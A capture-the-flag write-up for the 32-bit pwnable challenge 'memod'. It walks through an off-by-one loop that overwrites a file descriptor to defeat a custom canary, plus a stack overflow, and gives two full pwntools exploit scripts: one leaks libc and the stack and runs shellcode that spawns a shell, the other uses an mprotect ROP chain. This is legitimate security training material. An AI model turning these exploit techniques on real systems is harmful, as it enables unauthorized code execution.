+++
title = "memod"
date = "2024-07-08"
description = "pwnable challenge"

[taxonomies]
tags = ["ctf", "pwnable", "loop codition", "improper check", "bof", "rop"]
+++

## 0x00. Introduction
``` bash
[*] '/home/user/memod'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x8048000)
    Stack:    Executable
    RWX:      Has RWX segments
```

### Goal
``` c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  ...
  fd = open("/dev/urandom", 0);

  read(fd, &canary_backup, 4u);
  canary = canary_backup;

  if ( memcmp(&canary_backup, &canary, 4u) )
  {
    puts("***** ERROR! Stack Smash Attempt .. *****");
    exit(-1);
  }
  ...
}
```

A 4-byte random value is read from `/dev/urandom` to the global variable `canary_backup`, which is stored in the local variable `canary` and compared at the end.
If the value has changed, the process will be terminated, so this must be bypassed.


## 0x01. Vulnerability
``` c
  char s[256]; // [esp+10h] [ebp-128h] BYREF
  fgets(s, 512, stdin);
```

The first thing I noticed was a BOF occurs in variable `s`, which is stored in `ebp-0x128`.
But the `canary` still needs to be bypassed as mentioned.

``` c
  char file[32]; // [esp+110h] [ebp-28h] BYREF
  int fd; // [esp+130h] [ebp-8h]

  for ( i = 0; i <= 32; ++i )
  {
    s[0] = getchar();
    if ( s[0] - (unsigned int)'0' > 9 )
    {
      file[i] = 0;
      break;
    }
    file[i] = s[0];
  }
```

The next thing I noticed was the condition of the for loop.
Since the `file` array is 32 bytes and the condition is `i <= 32`, in the last loop, `file[32]` points to the lowest byte of `fd`.


## 0x02. Exploit
The problem that arise when `fd` is overwritten by exploiting the above vulnerailities are as follows.

``` c
  fd = open("/dev/urandom", 0);
  read(fd, &canary_backup, 4u);
  canary = canary_backup;
```

The `fd` that was holding file descriptor opened by `open()` is changed to a strange value.
There could be 2 options. One is to overwrite `fd` with 0 and input `stdin`; and the other is  to overwrite `fd` with a strange value so that no value will be written to `canary_backup`.

Therefore, if I cover `fd` with a strange value and put `0x00000000` in the local variable `canary`, I can pass `mcmcmp()`.

``` bash
[*] '/home/user/memod'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x8048000)
    Stack:    Executable
    RWX:      Has RWX segments
```

Now I tried to execute shell via shellcode, since the NX bit was off.
**But there was no point to leak stack address...**
I found the stack leak technique using the `environ` variable in libc, so I used this one for the exploit.

Of course, using ROP is another solution, so I also wrote payload using `mprotect()`.


## 0x03. Payload
### payload using environ
``` python
from pwn import *
from pwnlib.util.packing import p32, p64, u32, u64
import sys

DEBUG = True
BINARY = "memod"
LIBRARY = "libc.so.6"

bp = {
    'read_of_main' : 0x08048703,
    'fgets_of_main' : 0x804875a,
    'canary_backup' : 0x08049b2c,
    'end_of_main' : 0x080487ce,
}

gs = f'''
b *{bp['fgets_of_main']}
b *{bp['end_of_main']}
continue
'''
context.terminal = ['tmux', 'splitw', '-hf']

def main():
    if(len(sys.argv) > 1):
        s = remote("0.0.0.0", int(sys.argv[1]))
    else:
        s = process(BINARY)
        if DEBUG:
            gdb.attach(s, gs)
    elf = ELF(BINARY)
    lib = ELF(LIBRARY)

    # leak libc
    s.send(b"1" * 33)                   # overwrite fd
    s.recv(1024)

    payload = b"A" * 0x124              # dummy
    payload += b"\x00\x00\x00\x00"      # canary
    payload += b"BBBB"                  # sfp
    payload += p32(elf.plt['puts'])     # ret #1
    payload += p32(0x080485e4)          # ret #2 (pop ret gadget)
    payload += p32(elf.got['write'])    # argument #1
    payload += p32(elf.symbols['main']) # ret #3
    s.sendline(payload)
    r = s.recv(1024)
    libc = u32(r[0:4]) - lib.symbols["write"]
    environ = libc + lib.symbols['environ']
    log.info(f"libc : {hex(libc)}")
    log.info(f"environ : {hex(environ)}")

    # leak stack
    s.send(b"2" * 33)                   # overwrite fd
    s.recv(1024)

    payload = b"C" * 0x124              # dummy
    payload += b"\x00\x00\x00\x00"      # canary
    payload += b"DDDD"                  # sfp
    payload += p32(elf.plt['puts'])     # ret #1
    payload += p32(0x080485e4)          # ret #2 (pop ret gadget)
    payload += p32(environ)             # argument #1
    payload += p32(elf.symbols['main']) # ret #3
    s.sendline(payload)
    r = s.recv(1024)
    stack = u32(r[0:4])
    log.info(f"stack : {hex(stack)}")

    # execute shellcode
    s.send(b"3" * 33)
    s.recv(1024)

    payload = asm(shellcraft.execve("/bin/sh", 0, 0))   # shellcode
    payload += b"E" * (0x124 - len(payload))            # dummy
    payload += b"\x00\x00\x00\x00"                      # canary
    payload += b"FFFF"                                  # sfp
    payload += p32(stack - 0x1cc)                       # ret #1 (&shellcode)
    s.sendline(payload)

    s.interactive()

if __name__=='__main__':
    main()
```

### payload using mprotect
``` python
from pwn import *
from pwnlib.util.packing import p32, p64, u32, u64
import sys

DEBUG = True
BINARY = "memod"
LIBRARY = "libc.so.6"

bp = {
    'read_of_main' : 0x08048703,
    'fgets_of_main' : 0x804875a,
    'canary_backup' : 0x08049b2c,
    'end_of_main' : 0x080487ce,
    'mprotect' : 0xf7e9f020,
}

gs = f'''
b *{bp['end_of_main']}
continue
'''
context.terminal = ['tmux', 'splitw', '-hf']

def main():
    if(len(sys.argv) > 1):
        s = remote("0.0.0.0", int(sys.argv[1]))
    else:
        s = process(BINARY)
        if DEBUG:
            gdb.attach(s, gs)
    elf = ELF(BINARY)
    lib = ELF(LIBRARY)

    # leak libc
    s.send(b"1" * 33)                   # overwrite fd
    s.recv(1024)

    payload = b"A" * 0x124              # dummy
    payload += b"\x00\x00\x00\x00"      # canary
    payload += b"BBBB"                  # sfp
    payload += p32(elf.plt['puts'])     # ret #1
    payload += p32(0x080485e4)          # ret #2 (pr gadget)
    payload += p32(elf.got['write'])    # argument #1
    payload += p32(elf.symbols['main']) # ret #3
    s.sendline(payload)
    r = s.recv(1024)
    libc = u32(r[0:4]) - lib.symbols["write"]
    mprotect = libc + lib.symbols['mprotect']
    read = libc + lib.symbols['read']
    log.info(f"libc : {hex(libc)}")
    log.info(f"mprotect : {hex(mprotect)}")
    log.info(f"read : {hex(read)}")

    # add permission using mprotect
    s.send(b"2" * 33)                   # overwrite fd
    s.recv(1024)

    payload = b"C" * 0x124              # dummy
    payload += b"\x00\x00\x00\x00"      # canary
    payload += b"DDDD"                  # sfp
    payload += p32(mprotect)            # ret #1
    payload += p32(0x08048836)          # ret #2 (pppr gadget)
    payload += p32(bp['canary_backup'] & 0xfffff000) # argument #1
    payload += p32(0x1000)              # argument #2
    payload += p32(0x7)                 # argument #3
    payload += p32(read)                # ret #3
    payload += p32(bp['canary_backup']) # ret #4
    payload += p32(0)                   # argument #1
    payload += p32(bp['canary_backup']) # argument #2
    payload += p32(0x100)               # argument #3
    s.sendline(payload)

    # send shellcode
    payload = asm(shellcraft.execve("/bin/sh", 0, 0))
    s.sendline(payload)

    s.interactive()

if __name__=='__main__':
    main()
```